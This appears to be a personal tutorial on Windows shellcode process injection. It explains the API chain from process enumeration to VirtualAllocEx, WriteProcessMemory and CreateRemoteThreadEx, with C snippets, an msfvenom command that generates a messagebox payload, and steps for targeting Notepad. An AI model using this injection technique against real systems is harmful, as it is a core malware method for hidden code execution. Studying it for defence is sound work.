NECESSARY FUNCTIONS FOR PROCESS INJECTION
-------------------------------------------
If we are going to work with #include <tlhelp32.h>, we will use:

CreateToolhelp32Snapshot — to take a snapshot of the processes.

Process32First — to retrieve info about the first process.

Process32Next — to iterate over remaining processes.

OpenProcess — to get a handle to the target process.

VirtualAllocEx — to allocate memory in the target process.

WriteProcessMemory — to inject shellcode.

CreateRemoteThreadEx — to execute the shellcode.

SNAPSHOT CREATION & PROCESS ITERATION
-------------------------------------
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

This calls a Windows API function to create a snapshot of all currently running processes in the system.

- TH32CS_SNAPPROCESS: tells Windows you want to take a snapshot of the process list.
- 0: means "give me all processes" 
  (the second parameter can specify a specific PID if you're taking snapshots of threads or modules, but for processes, it's always 0).

CreateToolhelp32Snapshot() returns a HANDLE — basically a reference to a kernel object.

That handle lets you iterate through the list of processes using:

    Process32First(snapshot, &pe32);
    Process32Next(snapshot, &pe32);

These functions fill in the pe32 structure with info about each process: PID, exe name, parent PID, etc.

PROCESS32FIRST & PROCESS32NEXT
-------------------------------
Process32First() and Process32Next() are used to retrieve information about processes in the system.
- Process32First() retrieves information about the first process in the snapshot.
- Process32Next() retrieves information about the next process in the snapshot.
- Both functions fill a PROCESSENTRY32 structure with details about the process, such as its ID, name, and other attributes.
  BOOL Process32First(
  [in]      HANDLE           hSnapshot,
  [in, out] LPPROCESSENTRY32 lppe
); 

PROCESSENTRY32 STRUCTURE & SIZE
-------------------------------
pe32.dwSize = sizeof(PROCESSENTRY32);

How is the sizeof calculated?
sizeof is a compile-time operator.  
It returns the total number of bytes occupied by the type PROCESSENTRY32.

This structure is defined as:
typedef struct tagPROCESSENTRY32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    TCHAR szExeFile[MAX_PATH];
} PROCESSENTRY32;

So sizeof(PROCESSENTRY32) will compute the total size of all those fields.

OPENING A PROCESS
-----------------
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,   // Specifies the access rights requested for the process (e.g., read, write, terminate).
  [in] BOOL  bInheritHandle,    // If TRUE, the returned handle can be inherited by child processes; if FALSE, it cannot.
  [in] DWORD dwProcessId        // The unique identifier (ID) of the process to open.
);

- If the function succeeds, the return value is an open handle to the specified process.
- If the function fails, the return value is NULL.


MEMORY ALLOCATION IN REMOTE PROCESS
-----------------------------------
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,         // Handle to the process where memory will be allocated.
  [in, optional] LPVOID lpAddress,        // Starting address for the allocation. If NULL, the system picks.
  [in]           SIZE_T dwSize,           // Size of the memory block to allocate.
  [in]           DWORD  flAllocationType, // Type of allocation (e.g., MEM_COMMIT).
  [in]           DWORD  flProtect         // Memory protection (e.g., PAGE_READWRITE).
);

- If the function succeeds, the return value is a pointer to the allocated memory.
- If the function fails, the return value is NULL.


WRITING SHELLCODE INTO PROCESS MEMORY
-------------------------------------
BOOL WriteProcessMemory(
  [in] HANDLE hProcess,
  [in] LPVOID lpBaseAddress,
  [in] LPCVOID lpBuffer,
  [in] SIZE_T nSize,
  [out, optional] SIZE_T *lpNumberOfBytesWritten
);

Example:
```c
  if (WriteProcessMemory(hProcess, rAlloc_mem, ShellCode, sizeof(ShellCode), NULL)) {
      okay("Successfully wrote to process memory");
  } else {
      error("Failed to write to process memory: %lu", GetLastError());
      return EXIT_FAILURE;
  }

CREATING A REMOTE THREAD
-------------------------
CreateRemoteThreadEx(
[in] HANDLE hProcess,
[in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes,
[in] SIZE_T dwStackSize,
[in] LPTHREAD_START_ROUTINE lpStartAddress,
[in, optional] LPVOID lpParameter,
[in] DWORD dwCreationFlags,
[out, optional] LPDWORD lpThreadId
);

Example:
  HANDLE hThread = CreateRemoteThreadEx(
      hProcess, 
      NULL, 
      0, 
      (LPTHREAD_START_ROUTINE)rAlloc_mem, 
      NULL, 
      0, 
      NULL
  );

  if (hThread == NULL) {
      error("Failed to create remote thread: %lu", GetLastError());
      return EXIT_FAILURE;
  } else {
      okay("Successfully created remote thread");
  }
GENERATING SHELLCODE (KALI)
----------------------------
msfvenom -p windows/x64/messagebox TEXT="I Licked Herta" TITLE="Injected" -f c --var-name=ShellCode

FINDING PROCESS ID (PID) OF NOTEPAD
------------------------------------
PS> notepad
PS> tasklist | findstr /i notepad

tasklist lists all the processes.

findstr /i notepad filters the list for the notepad process.

If notepad is running, the output will look like:
Notepad.exe                  22248 Console                    1   101 888 Ko

